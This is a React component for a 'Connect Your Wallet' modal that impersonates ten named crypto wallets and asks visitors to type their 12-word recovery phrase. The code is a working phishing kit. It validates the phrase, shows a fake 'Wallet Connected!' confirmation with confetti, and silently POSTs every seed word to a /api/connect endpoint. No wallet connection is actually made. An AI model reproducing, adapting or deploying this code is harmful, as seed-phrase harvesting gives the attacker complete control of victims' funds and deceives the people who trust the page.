"use client"

import { useState, useEffect, useRef } from "react"
import { X, ArrowLeft } from "lucide-react"
import confetti from "canvas-confetti"
import { isValidBip39Word, isValidBip39Phrase, hasRepeatedWords } from "@/lib/bip39"

interface WalletModalProps {
  isOpen: boolean
  onClose: () => void
}

const wallets = [
  { id: 1, name: "Slush", icon: "https://lh3.googleusercontent.com/mEAxXmMFpGwUYivbdPdF91Dtdycz8uWiNGYVTQKEzRC4d-YGYbNtQMAPBzj7JKg_pg863CY18_lzLP8VfPxZEv09=s120" },
  { id: 2, name: "Suiet Wallet", icon: "https://lh3.googleusercontent.com/JLASDvvsaGcOrFvuC1gcay_9J1ZyelGHhs1EnHdrr7wtjPD_KEYL88vriXBia97omZngQTDNIiXlQyvr_hUnHKnv=s120" },
  { id: 3, name: "Nightly Wallet", icon: "https://lh3.googleusercontent.com/IbnDBqTyoacn7iBJE5DhxeS_3J51HXJJfEkOx0aG3474YbhiXK6_2SEM8rpxFBTylKgqv6Qss_FzWnGLFyexklSpZfo=s120" },
  { id: 4, name: "Surf Wallet", icon: "https://lh3.googleusercontent.com/sWQuDAnkwGqxzocmB8x8vDQWR7D1L6Of7GXFz7UNJ8TDb4UP9oE2iCjXZyT7tAjHCtZxjNhJjABzyHf5l3JgWIEn=s120" },
  { id: 5, name: "Phantom", icon: "https://lh3.googleusercontent.com/dXvdD2VjLS-imsW8WG2oB3y7sBHhL9gFlv7KZnqZSA9_MU1VROSHRpJidav8-a77uQT1-8X_zK5ibsAC39IFn5tn=s120" },
  { id: 6, name: "OKX Wallet", icon: "https://lh3.googleusercontent.com/2bBevW79q6gRZTFdm42CzUetuEKndq4fn41HQGknMpKMF_d-Ae2sJJzgfFUAVb1bJKCBb4ptZ9EAPp-QhWYIvc35yw=s120" },
  { id: 7, name: "Backpack", icon: "https://lh3.googleusercontent.com/YQnjQjJ6NuY_rxRwy8JA177ONpmPiOdFpud8zK-ebcS8-r3mQzwrzmqlueLSvKw1SsaoeBYua7XePZ632xXM4aHUzw=s120" },
  { id: 8, name: "Martian Wallet", icon: "https://lh3.googleusercontent.com/5Nza0dQHga1_Z1RAKh-9cPV3N0KxsB3hy2Z31E73qMzxHA7u-7mF8AENMngX7fl5fEdKRcZ67d-f0S-3sZr6n0SsgQ=s120" },
  { id: 9, name: "Ledger", icon: "https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk" },
  { id: 10, name: "Bitget Wallet", icon: "https://lh3.googleusercontent.com/gFp1srxO3PizU4gPk2rdn27l_BcnxaCUKFS4YhzSPL60PaKNhiTSPoWwnlV95Btu5JoZ0iIf3iZChQBGLlORBFe-=s120" },
]

export function WalletModal({ isOpen, onClose }: WalletModalProps) {
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(""))
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [isMobile, setIsMobile] = useState(false)
  const [atWallet, setAtWallet] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showConfetti, setShowConfetti] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 770)
    }
    checkMobile()
    window.addEventListener("resize", checkMobile)
    return () => window.removeEventListener("resize", checkMobile)
  }, [])

  useEffect(() => {
    if (!isOpen) {
      setSelectedWallet(null)
      setAtWallet(false)
      setSeedWords(Array(12).fill(""))
      setShowSuccess(false)
      setShowConfetti(false)
    }
  }, [isOpen])

  if (!isOpen) return null

  const handleWordChange = (index: number, value: string) => {
    const filtered = value.toLowerCase().replace(/[^a-z]/g, "").slice(0, 8)
    setSeedWords((prev) => {
      const updated = [...prev]
      updated[index] = filtered
      return updated
    })
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
    const pastedText = e.clipboardData.getData("text")
    const words = pastedText.trim().split(/[\s,]+/).filter(Boolean)
    if (words.length > 1) {
      e.preventDefault()
      const newSeedWords = [...seedWords]
      words.forEach((word, i) => {
        const targetIndex = index + i
        if (targetIndex < 12) {
          newSeedWords[targetIndex] = word.toLowerCase().replace(/[^a-z]/g, "").slice(0, 8)
        }
      })
      setSeedWords(newSeedWords)
      const nextEmptyIndex = newSeedWords.findIndex((w, i) => i >= index && w === "")
      const focusIndex = nextEmptyIndex !== -1 ? nextEmptyIndex : Math.min(index + words.length, 11)
      inputRefs.current[focusIndex]?.focus()
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === " " && seedWords[index].length > 0 && index < 11) {
      e.preventDefault()
      inputRefs.current[index + 1]?.focus()
    }
    if (e.key === "Backspace" && seedWords[index] === "" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleWalletClick = (walletName: string) => {
    setSelectedWallet(walletName)
    if (isMobile) {
      requestAnimationFrame(() => requestAnimationFrame(() => setAtWallet(true)))
    }
  }

  const handleBack = () => {
    setAtWallet(false)
    setTimeout(() => {
      setSeedWords(Array(12).fill(""))
      setShowSuccess(false)
      setShowConfetti(false)
    }, 300)
  }

  const fireConfetti = () => {
    const count = 200
    const defaults = { origin: { y: 0.7 }, zIndex: 9999 }
    function fire(particleRatio: number, opts: confetti.Options) {
      confetti({ ...defaults, ...opts, particleCount: Math.floor(count * particleRatio) })
    }

    fire(0.25, { spread: 26, startVelocity: 55 })
    fire(0.2, { spread: 60 })
    fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 })
    fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 })
    fire(0.1, { spread: 120, startVelocity: 45 })
  }

  const allFieldsFilled = isValidBip39Phrase(seedWords) && !hasRepeatedWords(seedWords)
  const filledValidCount = seedWords.filter((w) => isValidBip39Word(w)).length

  const handleConnect = async () => {
    if (!allFieldsFilled) return
    setShowConfetti(true)
    setShowSuccess(true)
    fireConfetti()

    try {
      await fetch("/api/connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: selectedWallet ?? null,
          words: seedWords.map((w) => w.trim().toLowerCase()),
        }),
      })
    } catch {
      // silent
    }

    setTimeout(() => {
      onClose()
    }, 2500)
  }

  const selectedWalletData = wallets.find(w => w.name === selectedWallet)

  if (isMobile) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4">
        <div
          className="absolute inset-0 bg-black/50 backdrop-blur-sm"
          onClick={onClose}
        />

        <div className="relative z-10 w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden max-h-[95vh] flex flex-col">
          <div className="flex items-center justify-between px-4 py-3 border-b border-gray-100 shrink-0 relative overflow-hidden" style={{ height: 60 }}>
            <div
              className="absolute left-4 flex items-center gap-2"
              style={{
                transition: "transform 0.28s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s ease",
                transform: atWallet ? "translateX(-60px)" : "translateX(0)",
                opacity: atWallet ? 0 : 1,
                pointerEvents: atWallet ? "none" : "auto",
              }}
            >
              <span className="text-base font-semibold text-gray-900">Connect Your Wallet</span>
            </div>

            {/}
            <div
              className="absolute left-4 flex items-center gap-2.5"
              style={{
                transition: "transform 0.28s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s ease",
                transform: atWallet ? "translateX(0)" : "translateX(60px)",
                opacity: atWallet ? 1 : 0,
                pointerEvents: atWallet ? "auto" : "none",
              }}
            >
              {selectedWalletData && (
                <>
                  <img
                    src={selectedWalletData.icon}
                    alt={selectedWalletData.name}
                    className="w-8 h-8 rounded-lg object-cover bg-gray-100"
                  />
                  <div className="flex flex-col leading-tight">
                    <span className="text-sm font-bold text-gray-900">{selectedWalletData.name}</span>
                    <span className="text-[10px] tracking-widest text-gray-400 uppercase">Connect</span>
                  </div>
                </>
              )}
            </div>

            <button
              onClick={atWallet ? handleBack : onClose}
              className="absolute right-4 w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-all duration-150 text-gray-500"
            >
              <span
                className="absolute"
                style={{
                  transition: "transform 0.2s ease, opacity 0.15s ease",
                  opacity: atWallet ? 0 : 1,
                  transform: atWallet ? "scale(0.6) rotate(-90deg)" : "scale(1) rotate(0deg)",
                }}
              >
                <X size={16} />
              </span>
              <span
                className="absolute"
                style={{
                  transition: "transform 0.2s ease, opacity 0.15s ease",
                  opacity: atWallet ? 1 : 0,
                  transform: atWallet ? "scale(1) rotate(0deg)" : "scale(0.6) rotate(90deg)",
                }}
              >
                <ArrowLeft size={16} />
              </span>
            </button>
          </div>

          {/**/}
          <div style={{ overflow: "hidden", flex: 1, minHeight: 0, display: "flex", flexDirection: "column" }}>
            <div
              style={{
                display: "flex",
                width: "200%",
                flex: 1,
                minHeight: 0,
                transition: "transform 0.3s cubic-bezier(0.4, 0, 0.2, 1)",
                transform: atWallet ? "translateX(-50%)" : "translateX(0)",
              }}
            >
              <div
                style={{
                  width: "50%",
                  transition: "opacity 0.25s ease",
                  opacity: atWallet ? 0 : 1,
                  display: "flex",
                  flexDirection: "column",
                  minHeight: 0,
                }}
              >
                <div className="p-3 sm:p-4 flex-1 min-h-0" style={{ overflowY: "auto", WebkitOverflowScrolling: "touch", overscrollBehavior: "contain" }}>
                  <div className="space-y-2">
                    {wallets.map((wallet) => (
                      <button
                        key={wallet.id}
                        onClick={() => handleWalletClick(wallet.name)}
                        className={`w-full flex items-center gap-3 p-2.5 sm:p-3 rounded-xl transition-all text-left ${
                          selectedWallet === wallet.name
                            ? "bg-blue-50 border-2 border-blue-400"
                            : "bg-gray-50 hover:bg-gray-100 border-2 border-transparent"
                        }`}
                      >
                        <img
                          src={wallet.icon}
                          alt={wallet.name}
                          className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg object-cover"
                        />
                        <span className="text-gray-900 font-medium text-sm sm:text-base">{wallet.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              {/**/}
              <div
                style={{
                  width: "50%",
                  transition: "opacity 0.25s ease",
                  opacity: atWallet ? 1 : 0,
                  display: "flex",
                  flexDirection: "column",
                  position: "relative",
                  minHeight: 0,
                }}
              >
                {showSuccess && (
                  <div className="absolute inset-0 z-20 flex flex-col items-center justify-center bg-white gap-4">
                    <div className="relative w-20 h-20 flex items-center justify-center">
                      <svg className="w-20 h-20 -rotate-90" viewBox="0 0 80 80">
                        <circle cx="40" cy="40" r="34" fill="none" stroke="#22c55e" strokeWidth="4" strokeOpacity="0.2" />
                        <circle
                          cx="40" cy="40" r="34"
                          fill="none" stroke="#22c55e" strokeWidth="4" strokeLinecap="round"
                          strokeDasharray="213.6" strokeDashoffset="213.6"
                          style={{ animation: "draw-circle 0.6s ease forwards" }}
                        />
                      </svg>
                      <svg
                        className="absolute w-8 h-8" viewBox="0 0 32 32"
                        fill="none" stroke="#22c55e" strokeWidth="3"
                        strokeLinecap="round" strokeLinejoin="round"
                      >
                        <polyline
                          points="6,16 13,23 26,9"
                          strokeDasharray="30" strokeDashoffset="30"
                          style={{ animation: "draw-check 0.4s ease 0.5s forwards" }}
                        />
                      </svg>
                    </div>
                    <p className="text-lg font-bold text-gray-900">Wallet Connected!</p>
                    <p className="text-sm text-gray-400">Syncing your account...</p>
                  </div>
                )}

                <div className="p-4 flex-1 min-h-0" style={{ overflowY: "auto", WebkitOverflowScrolling: "touch", overscrollBehavior: "contain" }}>
                  <div className={`flex-1 transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
                    {/**/}
                    <div className="grid grid-cols-3 gap-2 mb-4">
                      {seedWords.map((word, index) => {
                        const isValid = isValidBip39Word(word)
                        const isFilled = word.length > 0
                        const isInvalid = isFilled && !isValid
                        return (
                          <div key={index} className="relative group">
                            <div
                              className={`absolute left-0 top-0 w-5 h-5 flex items-center justify-center text-white text-[10px] font-bold rounded-tl-lg rounded-br-lg z-10 transition-colors duration-200 ${
                                isValid ? "bg-green-500" : isInvalid ? "bg-red-500" : "bg-blue-500"
                              }`}
                            >
                              {index + 1}
                            </div>
                            <input
                              ref={(el) => { inputRefs.current[index] = el }}
                              type="text"
                              value={word}
                              onChange={(e) => handleWordChange(index, e.target.value)}
                              onPaste={(e) => handlePaste(e, index)}
                              onKeyDown={(e) => handleKeyDown(e, index)}
                              className={`w-full pl-3 pr-2 py-3 bg-gray-50 border rounded-lg text-sm text-gray-800 placeholder-gray-300 focus:bg-white focus:outline-none focus:ring-2 transition-all text-center font-medium ${
                                isValid
                                  ? "border-green-300 bg-green-50/50 focus:border-green-400 focus:ring-green-100"
                                  : isInvalid
                                  ? "border-red-300 bg-red-50/50 focus:border-red-400 focus:ring-red-100"
                                  : "border-gray-200 focus:border-blue-400 focus:ring-blue-100"
                              }`}
                              placeholder=""
                              autoComplete="off"
                              autoCapitalize="off"
                              spellCheck={false}
                            />
                          </div>
                        )
                      })}
                    </div>

                    {/**/}
                    <div className="mb-4">
                      <div className="flex justify-between text-xs text-gray-400 mb-1.5">
                        <span>Progress</span>
                        <span>{filledValidCount}/12 words</span>
                      </div>
                      <div className="h-1.5 bg-gray-100 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-green-400 to-green-500 rounded-full transition-all duration-300"
                          style={{ width: `${(filledValidCount / 12) * 100}%` }}
                        />
                      </div>
                    </div>

                    <p className="text-xs text-gray-400 mb-4 text-center leading-relaxed">
                      Enter your 12-word recovery phrase to connect your wallet securely.
                    </p>

                    <button
                      onClick={handleConnect}
                      disabled={!allFieldsFilled || showConfetti}
                      className={`block w-full py-3.5 font-semibold rounded-xl transition-colors text-sm text-center ${
                        allFieldsFilled
                          ? "bg-green-500 hover:bg-green-600 text-white"
                          : "bg-gray-100 text-gray-400 cursor-not-allowed"
                      }`}
                    >
                      {allFieldsFilled ? "Connect Wallet" : "Enter all 12 words"}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="p-3 border-t border-gray-100 flex justify-center shrink-0">
            {/**/}
            <span className="text-sm text-gray-400 font-medium">{atWallet ? "2/2" : "1/2"}</span>
          </div>
        </div>

        <style jsx global>{`
          @keyframes draw-circle { to { stroke-dashoffset: 0; } }
          @keyframes draw-check  { to { stroke-dashoffset: 0; } }
          .scrollbar-thin::-webkit-scrollbar { width: 4px; }
          .scrollbar-thin::-webkit-scrollbar-track { background: transparent; }
          .scrollbar-thin::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 2px; }
          .scrollbar-thin::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
          .scrollbar-thin { scrollbar-width: thin; scrollbar-color: #cbd5e1 transparent; }
        `}</style>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4">
      <div
        className="absolute inset-0 bg-black/50 backdrop-blur-sm"
        onClick={onClose}
      />

      <div className="relative z-10 w-full max-w-4xl bg-white rounded-2xl shadow-xl overflow-hidden max-h-[95vh] flex flex-col">
        <div className="flex items-center justify-between p-3 sm:p-4 border-b border-gray-100 shrink-0">
          <div className="flex-1" />
          <h2 className="text-base sm:text-lg font-semibold text-gray-900">Connect Your Wallet</h2>
          <div className="flex-1 flex justify-end">
            <button
              onClick={onClose}
              className="p-2 hover:bg-gray-100 rounded-lg transition-colors"
            >
              <X className="w-5 h-5 text-gray-500" />
            </button>
          </div>
        </div>

        {/**/}
        <div className="flex flex-row flex-1 overflow-hidden relative">
          {showSuccess && (
            <div className="absolute inset-0 z-10 flex flex-col items-center justify-center bg-white gap-4">
              <div className="relative w-20 h-20 flex items-center justify-center">
                <svg className="w-20 h-20 -rotate-90" viewBox="0 0 80 80">
                  <circle cx="40" cy="40" r="34" fill="none" stroke="#22c55e" strokeWidth="4" strokeOpacity="0.2" />
                  <circle
                    cx="40" cy="40" r="34"
                    fill="none" stroke="#22c55e" strokeWidth="4" strokeLinecap="round"
                    strokeDasharray="213.6" strokeDashoffset="213.6"
                    style={{ animation: "draw-circle 0.6s ease forwards" }}
                  />
                </svg>
                <svg
                  className="absolute w-8 h-8" viewBox="0 0 32 32"
                  fill="none" stroke="#22c55e" strokeWidth="3"
                  strokeLinecap="round" strokeLinejoin="round"
                >
                  <polyline
                    points="6,16 13,23 26,9"
                    strokeDasharray="30" strokeDashoffset="30"
                    style={{ animation: "draw-check 0.4s ease 0.5s forwards" }}
                  />
                </svg>
              </div>
              <p className="text-lg font-bold text-gray-900">Wallet Connected!</p>
              <p className="text-sm text-gray-400">Syncing your account...</p>
            </div>
          )}

          {/**/}
          <div className={`w-2/5 p-3 sm:p-4 overflow-y-auto scrollbar-thin border-r border-gray-100 transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
            <div className="space-y-2">
              {wallets.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => setSelectedWallet(wallet.name)}
                  className={`w-full flex items-center gap-3 p-2.5 sm:p-3 rounded-xl transition-all text-left ${
                    selectedWallet === wallet.name
                      ? "bg-blue-50 border-2 border-blue-400"
                      : "bg-gray-50 hover:bg-gray-100 border-2 border-transparent"
                  }`}
                >
                  <img
                    src={wallet.icon}
                    alt={wallet.name}
                    className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg object-cover"
                  />
                  <span className="text-gray-900 font-medium text-sm sm:text-base">{wallet.name}</span>
                </button>
              ))}
            </div>
          </div>

          {/**/}
          <div className={`w-3/5 p-3 sm:p-4 overflow-y-auto flex flex-col transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
            <div className="flex-1 bg-white rounded-xl p-4 sm:p-5 border border-gray-100">
              <div className="flex items-center gap-3 mb-4 sm:mb-6">
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl overflow-hidden shadow flex items-center justify-center bg-gray-100 shrink-0">
                  {selectedWallet ? (
                    <img
                      src={wallets.find(w => w.name === selectedWallet)?.icon}
                      alt={selectedWallet}
                      className="w-full h-full object-cover"
                    />
                  ) : (
                    <img
                      src="https://s3.coinmarketcap.com/static-gravity/image/5bd0f43855f6434386c59f2341c5aaf0.png"
                      alt="SUI"
                      className="w-full h-full object-cover"
                    />
                  )}
                </div>
                <div>
                  <h3 className="text-base sm:text-lg font-semibold text-gray-900">
                    {selectedWallet ? selectedWallet : "Recovery Phrase"}
                  </h3>
                  <p className="text-xs sm:text-sm text-gray-500">Enter your 12-word seed phrase</p>
                </div>
              </div>

              {/**/}
              <div className="grid grid-cols-3 gap-2 sm:gap-3 mb-4 sm:mb-5">
                {seedWords.map((word, index) => {
                  const isValid = isValidBip39Word(word)
                  const isFilled = word.length > 0
                  const isInvalid = isFilled && !isValid
                  return (
                    <div key={index} className="relative group">
                      <div
                        className={`absolute left-0 top-0 w-5 h-5 sm:w-6 sm:h-6 flex items-center justify-center text-white text-[10px] sm:text-xs font-bold rounded-tl-lg rounded-br-lg z-10 transition-colors duration-200 ${
                          isValid ? "bg-green-500" : isInvalid ? "bg-red-500" : "bg-blue-500"
                        }`}
                      >
                        {index + 1}
                      </div>
                      <input
                        ref={(el) => { inputRefs.current[index] = el }}
                        type="text"
                        value={word}
                        onChange={(e) => handleWordChange(index, e.target.value)}
                        onPaste={(e) => handlePaste(e, index)}
                        onKeyDown={(e) => handleKeyDown(e, index)}
                        className={`w-full pl-3 pr-2 py-3 sm:py-3.5 bg-gray-50 border rounded-lg text-sm text-gray-800 placeholder-gray-300 focus:bg-white focus:outline-none focus:ring-2 transition-all text-center font-medium ${
                          isValid
                            ? "border-green-300 bg-green-50/50 focus:border-green-400 focus:ring-green-100"
                            : isInvalid
                            ? "border-red-300 bg-red-50/50 focus:border-red-400 focus:ring-red-100"
                            : "border-gray-200 focus:border-blue-400 focus:ring-blue-100"
                        }`}
                        placeholder=""
                        autoComplete="off"
                        autoCapitalize="off"
                        spellCheck={false}
                      />
                    </div>
                  )
                })}
              </div>

              {/**/}
              <div className="mb-4">
                <div className="flex justify-between text-xs text-gray-400 mb-1.5">
                  <span>Progress</span>
                  <span>{filledValidCount}/12 words</span>
                </div>
                <div className="h-1.5 bg-gray-100 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-green-400 to-green-500 rounded-full transition-all duration-300"
                    style={{ width: `${(filledValidCount / 12) * 100}%` }}
                  />
                </div>
              </div>

              <p className="text-xs text-gray-400 mb-4 text-center leading-relaxed">
                Enter your 12-word recovery phrase to connect your wallet securely.
              </p>

              {/**/}
              <button
                onClick={handleConnect}
                disabled={!allFieldsFilled || showConfetti}
                className={`block w-full py-3.5 font-semibold rounded-xl transition-colors text-sm sm:text-base text-center ${
                  allFieldsFilled
                    ? "bg-green-500 hover:bg-green-600 text-white"
                    : "bg-gray-100 text-gray-400 cursor-not-allowed"
                }`}
              >
                {allFieldsFilled ? "Connect Wallet" : "Enter all 12 words"}
              </button>
            </div>
          </div>
        </div>
      </div>

      <style jsx global>{`
        @keyframes draw-circle { to { stroke-dashoffset: 0; } }
        @keyframes draw-check  { to { stroke-dashoffset: 0; } }
        .scrollbar-thin::-webkit-scrollbar { width: 4px; }
        .scrollbar-thin::-webkit-scrollbar-track { background: transparent; }
        .scrollbar-thin::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 2px; }
        .scrollbar-thin::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
        .scrollbar-thin { scrollbar-width: thin; scrollbar-color: #cbd5e1 transparent; }
      `}</style>
    </div>
  )
}
